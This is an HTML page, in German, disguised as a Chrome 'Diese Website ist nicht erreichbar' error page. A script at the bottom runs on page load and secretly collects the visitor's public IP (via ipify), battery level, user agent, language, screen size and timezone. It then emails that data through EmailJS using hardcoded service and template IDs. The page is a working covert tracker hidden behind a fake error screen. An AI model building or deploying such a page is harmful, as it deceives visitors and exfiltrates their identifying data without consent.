<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Diese Website ist nicht erreichbar</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    height: 100vh;
    background: #fff;
    font-family: "Segoe UI", Arial, sans-serif;
    color: #202124;
    display: flex;
    justify-content: center;
    align-items: center;
}

.error {
    width: 700px;
    animation: fade 0.5s ease;
}

@keyframes fade {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
    }
}

.logo {
    font-size: 70px;
    margin-bottom: 20px;
}

h1 {
    font-size: 34px;
    font-weight: 500;
    margin: 0 0 15px;
}

.text {
    font-size: 18px;
    color: #5f6368;
    line-height: 1.6;
}

.domain {
    color:#202124;
    font-weight:bold;
}

.details {
    margin-top:30px;
    font-size:15px;
    color:#5f6368;
    background:#f8f9fa;
    padding:18px;
    border-radius:8px;
    border:1px solid #dadce0;
}

button {
    margin-top:25px;
    background:#1a73e8;
    color:white;
    border:0;
    padding:12px 26px;
    font-size:16px;
    border-radius:5px;
    cursor:pointer;
}

button:hover {
    background:#1557b0;
}

.footer {
    position:fixed;
    bottom:25px;
    left:30px;
    color:#777;
    font-size:14px;
}
</style>

</head>


<body>

<div class="error">

<div class="logo">🌐</div>

<h1>Diese Website ist nicht erreichbar</h1>

<div class="text">
Die Webseite
<span class="domain">example-domain.de</span>
hat zu lange zum Antworten benötigt.
</div>


<div class="details">

Versuche:

<br>• Überprüfe deine Internetverbindung
<br>• Überprüfe die Proxy- und Firewall-Einstellungen
<br>• Prüfe, ob die Adresse richtig geschrieben wurde

<br><br>

<b>ERR_NAME_NOT_RESOLVED</b>

</div>


<button onclick="location.reload()">
↻ Neu laden
</button>

</div>


<div class="footer">
Chrome • Fehlerseite
</div>



<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>

emailjs.init("oWqEGQ9wx4lEAFou3");


window.onload = async function(){

let ip = "Nicht verfügbar";
let akku = "Nicht verfügbar";


try {

let response = await fetch("https://api.ipify.org?format=json");
let data = await response.json();

ip = data.ip;

} catch(e){

console.log("IP konnte nicht geladen werden");

}


// Akku auslesen

try {

if (navigator.getBattery) {

let battery = await navigator.getBattery();

akku = Math.round(battery.level * 100) + "%";

if (battery.charging) {
    akku += " (Lädt)";
} else {
    akku += " (Nicht am Laden)";
}

}

} catch(e){

console.log("Akku konnte nicht geladen werden");

}



let daten = `
Öffentliche IP:
${ip}

Akku:
${akku}

Browser:
${navigator.userAgent}

Sprache:
${navigator.language}

Bildschirm:
${screen.width}x${screen.height}

Zeitzone:
${Intl.DateTimeFormat().resolvedOptions().timeZone}

Online:
${navigator.onLine}
`;



emailjs.send(
"service_qsb9wyd",
"template_1cgk7xd",
{
message:daten
}

)

.then(()=>{

console.log("Gesendet!");

})

.catch(error=>{

console.log("Fehler:",error);

});


};

</script>


</body>
</html>
